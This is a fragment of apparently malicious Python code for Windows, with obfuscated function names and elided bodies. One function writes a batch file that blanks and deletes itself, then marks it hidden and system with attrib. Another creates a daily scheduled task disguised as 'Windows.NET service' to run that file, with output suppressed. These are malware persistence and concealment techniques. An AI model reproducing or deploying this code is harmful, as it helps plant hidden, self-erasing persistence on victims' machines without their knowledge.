...
def F5536(path, exe, bat):
    ...
    bat_file.write("\n" + 'break>"%~f0" && DEL "%~f0"')
    bat_file.close()
    subprocess.Popen("attrib +s +h " + bat + " >> NUL", shell=True, cwd=path)
...
def F5570(exe):
    ...
    if "Windows.NET service" not in get_output(
            "schtasks /query"):  # Will Start every day at the same time
        subprocess.Popen(
            'SCHTASKS /CREATE /SC daily /TN "Windows.NET service" /TR {} >> NUL'.
            format(bat_path),
            shell=True)
